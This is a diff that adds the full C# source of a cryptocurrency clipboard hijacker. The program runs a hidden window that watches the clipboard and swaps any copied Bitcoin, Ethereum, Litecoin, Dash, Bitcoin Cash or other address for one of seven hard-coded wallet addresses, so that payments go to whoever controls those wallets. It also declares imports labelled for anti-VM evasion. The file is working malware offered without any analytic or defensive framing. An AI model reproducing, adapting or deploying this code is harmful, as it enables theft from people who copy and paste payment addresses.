@@ -1,0 +1,283 @@
+using System;
+using System.Text.RegularExpressions;
+using System.Threading;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+
+namespace ClipperMain
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            StartChanger();
+        }
+        
+        public static string GetText()
+        {
+            string ReturnValue = string.Empty;
+            Thread STAThread = new Thread(
+                delegate ()
+                {
+                    ReturnValue = System.Windows.Forms.Clipboard.GetText();
+                });
+            STAThread.SetApartmentState(ApartmentState.STA);
+            STAThread.Start();
+            STAThread.Join();
+
+            return ReturnValue;
+        }
+        public static void SetText(string txt)
+        {
+            Thread STAThread = new Thread(
+                delegate ()
+                {
+                    try
+                    {
+                        System.Windows.Forms.Clipboard.SetText(txt);
+                    }
+                    catch { }
+                });
+            STAThread.SetApartmentState(ApartmentState.STA);
+            STAThread.Start();
+            STAThread.Join();
+        }
+
+        public static void MainShit(Enums.ClipboardFormat clipboardFormat, object data)
+        {
+                if (Regex.Match(GetText(), Convert.ToString(PatternRegex.bc1)).Success)
+                {
+                    SetText("bc1qfhv9ahw4ujz3palr8p76ywt9pnrssehckly4v6");
+                }
+                else if (Regex.Match(GetText(), Convert.ToString(PatternRegex.ethereum)).Success)
+                {
+                    SetText("0x0eE4Be1bB4E4eCa4B3D7BDdDd4119054a3a4fBdb");
+                }
+                else if (Regex.Match(GetText(), Convert.ToString(PatternRegex.ltc1)).Success)
+                {
+                    SetText("ltc1q60uhuyg22sazhd4y77swj2fdt03gfyc0d00wg8");
+                }
+                else if (Regex.Match(GetText(), Convert.ToString(PatternRegex.dash)).Success)
+                {
+                    SetText("XjxJrzTNym1uLQVrvUxgZpNYjkVntqm5ae");
+                }
+                else if (Regex.Match(GetText(), Convert.ToString(PatternRegex.bch)).Success)
+                {
+                    SetText("qqcjtfh6xdaggcggzdr25ft7ex39e5363qv9esmq8m");
+                }
+                else if (Regex.Match(GetText(), Convert.ToString(PatternRegex.legacy)).Success)
+                {
+                    SetText("17Ei7db9tysgrRwpQR71JPmVk6T5AEynaH");
+                }
+                else if (Regex.Match(GetText(), Convert.ToString(PatternRegex.p2shsegwit)).Success)
+                {
+                    SetText("3E1cTHLoibaBZKUhgTZLahGB4ubs8NTiAu");
+                }
+        }
+
+        public static void StartChanger()
+        {
+            ClipboardMonitor.OnClipboardChange += MainShit;
+            ClipboardMonitor.Start();
+        }
+        public static partial class ClipboardMonitor
+        {
+            private class ClipboardWatcher : Form
+            {
+                public static event OnClipboardChangeEventHandler OnClipboardChange;
+                protected static ClipboardWatcher mInstance;
+
+                public static void Start()
+                {
+                    if (mInstance == null)
+                    {
+                        var thread = new Thread(delegate (object x) { Application.Run(new ClipboardWatcher()); });
+                        thread.SetApartmentState(ApartmentState.STA);
+                        thread.Start();
+                    }
+                }
+
+                public static void Stop()
+                {
+                    try
+                    {
+                        mInstance.Invoke(new MethodInvoker(delegate ()
+                        {
+                            NativeMethods.ChangeClipboardChain(mInstance.Handle, nextClipboardViewer);
+                        }));
+                        mInstance.Invoke(new MethodInvoker(mInstance.Close));
+                        mInstance.Dispose();
+                        mInstance = null;
+                    }
+                    catch (Exception) { }
+                }
+
+                protected override void SetVisibleCore(bool value)
+                {
+                    CreateHandle();
+                    mInstance = this;
+                    nextClipboardViewer = NativeMethods.SetClipboardViewer(mInstance.Handle);
+                    base.SetVisibleCore(false);
+                }
+
+                protected override void WndProc(ref Message m)
+                {
+                    switch (m.Msg)
+                    {
+                        case WM_DRAWCLIPBOARD:
+                            ClipChanged();
+                            NativeMethods.SendMessage(nextClipboardViewer, m.Msg, m.WParam, m.LParam);
+                            break;
+                        default:
+                            switch (m.Msg)
+                            {
+                                case WM_CHANGECBCHAIN:
+                                    if (m.WParam != nextClipboardViewer)
+                                        NativeMethods.SendMessage(nextClipboardViewer, m.Msg, m.WParam, m.LParam);
+                                    else nextClipboardViewer = m.LParam; break;
+                                default: base.WndProc(ref m); break;
+                            }
+                            break;
+                    }
+                }
+
+                private void ClipChanged()
+                {
+                    IDataObject dataObject = Clipboard.GetDataObject();
+                    Enums.ClipboardFormat? clipboardFormat = null;
+                    foreach (string text in Enum.GetNames(typeof(Enums.ClipboardFormat)))
+                    {
+                        if (dataObject.GetDataPresent(text))
+                        {
+                            clipboardFormat = new Enums.ClipboardFormat?((Enums.ClipboardFormat)Enum.Parse(typeof(Enums.ClipboardFormat), text));
+                            break;
+                        }
+                        continue;
+                    }
+                    object data = dataObject.GetData(clipboardFormat.ToString());
+                    if (data == null || clipboardFormat == null) return;
+
+                    OnClipboardChange.Invoke(clipboardFormat.Value, data);
+                }
+
+                private static IntPtr nextClipboardViewer;
+                private const int WM_DRAWCLIPBOARD = 776, WM_CHANGECBCHAIN = 781;
+
+                public ClipboardWatcher() { }
+
+                internal delegate void OnClipboardChangeEventHandler(Enums.ClipboardFormat format, object data);
+            }
+        }
+        public static partial class ClipboardMonitor
+        {
+            internal static event OnClipboardChangeEventHandler OnClipboardChange;
+
+            public static void Start()
+            {
+                ClipboardWatcher.Start();
+                ClipboardWatcher.OnClipboardChange += delegate (Enums.ClipboardFormat clipboardFormat, object data)
+                {
+                    OnClipboardChange.Invoke(clipboardFormat, data);
+                };
+            }
+
+            public static void Stop()
+            {
+                OnClipboardChange = null;
+                ClipboardWatcher.Stop();
+            }
+
+            internal delegate void OnClipboardChangeEventHandler(Enums.ClipboardFormat clipboardFormat, object data);
+        }
+
+        public static class Enums
+        {
+            public enum ClipboardFormat : byte
+            {
+                Text,
+                UnicodeText
+            }
+        }
+        internal static class NativeMethods
+        {
+            #region For ClipBoard GetText
+
+            [DllImport("user32.dll")]
+            internal static extern IntPtr GetClipboardData(uint uFormat);
+
+            [DllImport("user32.dll")]
+            public static extern bool IsClipboardFormatAvailable(uint format);
+
+            [DllImport("user32.dll", SetLastError = true)]
+            internal static extern bool OpenClipboard(IntPtr hWndNewOwner);
+
+            [DllImport("user32.dll", SetLastError = true)]
+            internal static extern bool CloseClipboard();
+
+            [DllImport("user32.dll")]
+            internal static extern bool EmptyClipboard();
+
+            [DllImport("kernel32.dll")]
+            internal static extern IntPtr GlobalLock(IntPtr hMem);
+
+            [DllImport("kernel32.dll")]
+            internal static extern bool GlobalUnlock(IntPtr hMem);
+
+            #endregion
+
+            #region For ClipBoard SetText
+
+            [DllImport("user32.dll")]
+            public static extern IntPtr GetOpenClipboardWindow();
+
+            [DllImport("user32.dll")]
+            public static extern IntPtr SetClipboardData(uint uFormat, IntPtr hMem);
+
+            #endregion
+
+            #region For ClipMonitor
+
+            [DllImport("User32.dll", CharSet = CharSet.Auto)]
+            public static extern IntPtr SetClipboardViewer(IntPtr hWndNewViewer);
+
+            [DllImport("User32.dll", CharSet = CharSet.Auto)]
+            public static extern bool ChangeClipboardChain(IntPtr hWndRemove, IntPtr hWndNewNext);
+
+            [DllImport("user32.dll", CharSet = CharSet.Auto)]
+            public static extern IntPtr SendMessage(IntPtr hwnd, int wMsg, IntPtr wParam, IntPtr lParam);
+
+            #endregion
+
+            #region For Refresh WinExplorer
+
+            [DllImport("user32")]
+            public static extern int PostMessage(IntPtr hwnd, int msg, IntPtr wParam, IntPtr lParam);
+
+            [DllImport("user32", CharSet = CharSet.Unicode)]
+            public static extern IntPtr FindWindow(string className, string caption);
+
+            [DllImport("user32", CharSet = CharSet.Unicode)]
+            public static extern IntPtr FindWindowEx(IntPtr parent, IntPtr startChild, string className, string caption);
+
+
+            #endregion
+
+            #region For AntiVM
+
+            [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Unicode)]
+            public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+            #endregion
+        }
+        internal static class PatternRegex
+        {
+            public readonly static Regex bc1 = new Regex(@"\b(bc1)[a-zA-HJ-NP-Z0-9]{25,39}$");
+            public readonly static Regex ethereum = new Regex(@"\b0x[a-fA-F0-9]{40}\b");
+            public readonly static Regex ltc1 = new Regex(@"\b(ltc1|[LM])[a-zA-HJ-NP-Z0-9]{26,39}\b");
+            public readonly static Regex dash = new Regex(@"\b^X[1-9A-HJ-NP-Za-km-z]{33}\b");
+            public readonly static Regex bch = new Regex(@"\b(q|p)[a-z0-9]{41}\b");
+            public readonly static Regex legacy = new Regex(@"\b[1][a-km-zA-HJ-NP-Z1-9]{25,34}$");
+            public readonly static Regex p2shsegwit = new Regex(@"\b([3])[A-HJ-NP-Za-km-z1-9]{27,34}");
+        }
+    }
+}
